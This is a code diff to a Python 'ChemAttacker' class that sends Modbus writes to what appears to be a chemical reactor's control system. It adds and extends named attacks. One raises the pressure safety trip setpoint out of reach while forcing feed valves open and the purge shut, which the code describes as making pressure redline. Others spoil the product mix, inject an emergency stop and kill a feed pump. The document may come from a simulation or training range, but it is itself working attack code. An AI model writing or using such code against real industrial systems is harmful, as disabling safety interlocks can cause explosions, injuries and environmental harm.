@@ -52,10 +52,13 @@ class ChemAttacker:
         return self._modbus(struct.pack(">BHH", 0x05, p.address, 0xFF00 if on else 0x0000)) is not None
 
     # -- named attacks --
-    def defeat_protection(self) -> dict:
-        ok = self.write_register("Pressure_HH_SP", 4100.0)      # above the ceiling -> never trips
-        return {"attack": "defeat-protection", "ok": ok,
-                "note": "Pressure safety setpoint raised to 4100 kPa - trip disarmed"}
+    def pressure_redline(self) -> dict:
+        self.write_register("Pressure_HH_SP", 4100.0)      # above the ceiling -> never trips
+        a = self.write_register("Feed1_Valve_Cmd", 100.0)
+        b = self.write_register("Feed2_Valve_Cmd", 100.0)
+        c = self.write_register("Purge_Valve_Cmd", 0.0)
+        return {"attack": "pressure-redline", "ok": a and b and c,
+                "note": "Safety setpoint defeated AND valves forced open - pressure redlines"}
 
     def valve_override(self) -> dict:
         a = self.write_register("Feed1_Valve_Cmd", 100.0)
@@ -63,6 +66,13 @@ class ChemAttacker:
         c = self.write_register("Purge_Valve_Cmd", 0.0)
         return {"attack": "valve-override", "ok": a and b and c,
                 "note": "Feeds forced 100%, purge shut - reactor pressure climbs"}
+
+    def spoil_product(self) -> dict:
+        a = self.write_register("Feed1_Valve_Cmd", 100.0)
+        b = self.write_register("Feed2_Valve_Cmd", 0.0)
+        c = self.write_register("Purge_Valve_Cmd", 0.0)
+        return {"attack": "spoil-product", "ok": a and b and c,
+                "note": "Feed 1 flooded, Feed 2 killed - chemical mixture ruined (color changes)"}
 
     def overfill(self) -> dict:
         a = self.write_register("Product_Valve_Cmd", 0.0)
@@ -73,19 +83,24 @@ class ChemAttacker:
 
     def estop_injection(self) -> dict:
         ok = self.write_coil("Reactor_ESD", True)
+        self.write_register("Feed1_Valve_Cmd", 0.0)
+        self.write_register("Feed2_Valve_Cmd", 0.0)
+        self.write_register("Purge_Valve_Cmd", 100.0)
         return {"attack": "estop-injection", "ok": ok,
-                "note": "Emergency shutdown coil forced - plant slams to safe-state (denial)"}
+                "note": "Emergency shutdown coil forced - plant slams to safe-state (valves drop to 0)"}
 
     def pump_kill(self) -> dict:
         ok = self.write_coil("Feed_Pump_1", False)
-        return {"attack": "pump-kill", "ok": ok, "note": "Feed pump 1 forced off"}
+        self.write_register("Feed1_Valve_Cmd", 0.0)
+        return {"attack": "pump-kill", "ok": ok, "note": "Feed pump 1 forced off and valve shut"}
 
 
 ATTACKS = {
-    "defeat-protection": "defeat_protection",
+    "pressure-redline": "pressure_redline",
     "valve-override": "valve_override",
     "overfill": "overfill",
     "estop-injection": "estop_injection",
+    "spoil-product": "spoil_product",
     "pump-kill": "pump_kill",
 }
 
